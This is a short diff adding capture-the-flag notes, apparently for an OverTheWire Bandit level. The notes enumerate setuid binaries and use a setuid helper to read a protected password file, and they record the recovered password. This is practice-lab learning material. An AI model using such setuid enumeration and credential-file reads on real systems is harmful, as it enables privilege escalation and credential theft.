@@ -1,0 +1,5 @@
+find / -perm -4000 2>/dev/null
+./bandit20-do id
+./bandit20-do cat /etc/bandit_pass/bandit20
+
+awhqfNnAbc1naukrpqDYcF95h7HoMTrC
